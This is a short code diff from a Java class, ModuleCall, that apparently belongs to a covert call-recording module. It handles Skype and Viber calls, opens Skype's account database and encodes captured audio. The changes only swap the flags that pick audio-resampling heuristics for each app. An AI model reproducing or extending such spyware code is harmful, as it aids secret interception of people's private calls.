@@ -939,14 +939,14 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 		}
 		
 		// Decide heuristics logic
-		boolean heur = false;
+		boolean heur = true;
 		
-		if (callInfo.heur && remote) { // Skype
+		if (!callInfo.heur && remote) { // Skype
 			if (Cfg.DEBUG) {
 				Check.log(TAG + "(encodeChunks): Skype call in progress, applying bitrate heuristics on remote channel only");
 			}
 			
-			heur = true;
+			heur = false;
 		}
 
 		if (audioEncoder.encodetoAmr(encodedFile, audioEncoder.resample(heur))) {
@@ -1093,7 +1093,7 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 			callInfo.account = account;
 			callInfo.programId = 0x0146;
 			callInfo.delay = false;
-			callInfo.heur = true;
+			callInfo.heur = false;
 
 			GenericSqliteHelper helper = ChatSkype.openSkypeDBHelper(account);
 
@@ -1107,7 +1107,7 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 			boolean ret = false;
 			callInfo.processName = "com.viber.voip";
 			callInfo.delay = true;
-			callInfo.heur = false;
+			callInfo.heur = true;
 			
 			// open DB
 			callInfo.programId = 0x0148;
